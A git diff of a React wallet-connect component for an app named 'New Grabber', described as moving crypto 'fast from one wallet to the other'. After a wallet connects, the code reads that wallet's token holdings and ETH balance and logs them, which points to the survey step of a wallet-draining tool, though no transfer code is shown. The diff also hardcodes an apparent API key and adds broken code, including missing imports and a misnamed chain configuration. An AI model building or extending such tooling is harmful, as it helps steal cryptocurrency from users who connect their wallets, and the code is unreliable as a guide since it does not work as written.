@@ -1,16 +1,13 @@
 import { useState, useEffect } from 'react';
 import { createWeb3Modal, useWeb3Modal, defaultWagmiConfig } from '@web3modal/wagmi/react'
-// import { WalletConnectChainID } from '@tronweb3/walletconnect-tron';
-// import Web3 from 'web3'
-import { WagmiConfig, useAccount, useDisconnect } from 'wagmi'
-import { mainnet, arbitrum, polygon, bsc, polygonMumbai, base } from 'wagmi/chains'
-import { fetchBalance, Chain } from '@wagmi/core'
-import { Tron } from './Tron'
+import { WagmiConfig, useAccount, useDisconnect, configureChains } from 'wagmi'
+// import { mainnet, arbitrum, polygon, bsc, polygonMumbai, base } from 'wagmi/chains'
+import * as chains from 'wagmi/chains'
+import { fetchBalance } from '@wagmi/core'
+import { CovalentClient as Client } from "@covalenthq/client-sdk";
 
-import Moralis from 'moralis';
 // 1. Get projectId
 const projectId = import.meta.env.VITE_PROJECT_ID;
-const moralisApi = import.meta.env.VITE_MORALIS_API;
 const metadata = {
     name: 'New Grabber',
     description: 'New Grabber for Moving Crypto Fast from one wallet to the other',
@@ -19,8 +16,11 @@ const metadata = {
 }
 
 // 2. Create wagmiConfig
-const chains = [mainnet, arbitrum, polygon, bsc, polygonMumbai, base, Tron];
-const wagmiConfig = defaultWagmiConfig({ chains, projectId, metadata })
+// const chains = [mainnet, arbitrum, polygon, bsc, polygonMumbai, base];
+const { Chains, publicClient } = configureChains(chains, [alchemyProvider({ apiKey: 'yourAlchemyApiKey' }), publicProvider()],)
+// const Chains = [chains]
+console.log(Chains);
+const wagmiConfig = defaultWagmiConfig({ Chains, projectId, metadata })
 
 /**
 + * Renders the Connect component.
@@ -30,7 +30,7 @@ const wagmiConfig = defaultWagmiConfig({ chains, projectId, metadata })
 export function Connect() {
     return (
         <WagmiConfig config={wagmiConfig}>
-            <ConnectButton web3Modal={createWeb3Modal({ wagmiConfig, projectId, chains })} />
+            <ConnectButton web3Modal={createWeb3Modal({ wagmiConfig, projectId, Chains })} />
         </WagmiConfig>
     )
 }
@@ -50,19 +50,19 @@ function ConnectButton() {
 
     useEffect(() => {
         const fetchData = async () => {
-            if (isConnected && address) {
-                try {
-                    await Moralis.start({ apiKey: moralisApi });
-                    const response = await Moralis.EvmApi.token.getWalletTokenBalances({
-                        chain: Moralis.EvmUtils.EvmChain.ETHEREUM,
-                        address: address
-                    });
-                    setTokens(response.raw);
-                } catch (error) {
-                    console.error(error);
+            try {
+                if (isConnected && address) {
+                    const client = new Client("cqt_rQrrKxGXCgG9kqT9W8BDHMHMgRCx");
+                    const resp = await client.BalanceService.getTokenBalancesForWalletAddress("eth-mainnet", `${ address }`);
+                    console.log(resp.data);
+                    setTokens(resp.data);
+
+                    const ethBalance = await fetchBalance({ address: address });
+                    setBalance(ethBalance);
                 }
-                const ethBalance = await fetchBalance({ address: address });
-                setBalance(ethBalance);
+            } catch (error) {
+                console.error(error);
+                // Handle the error, e.g. show an error message to the user
             }
         };
 
@@ -76,7 +76,7 @@ function ConnectButton() {
         }
     }, [isDisconnected, open]);
 
-    console.log(Moralis.EvmUtils.EvmChain.ETHEREUM._value, tokens);
+    console.log(`tokens: ${ JSON.stringify(tokens) }`);
 
     return (
         <>
@@ -85,7 +85,7 @@ function ConnectButton() {
             {isConnected && (
                 <>
                     <p>Address: {address}</p>
-                    <p>Balance: {balance.formatted} {balance.symbol}</p>
+                    <p>Balance: {balance ? `${ balance.formatted } ${ balance.symbol }` : 'Loading...'}</p>
                     <button onClick={handleDisconnect}>Disconnect</button>
                 </>
             )}
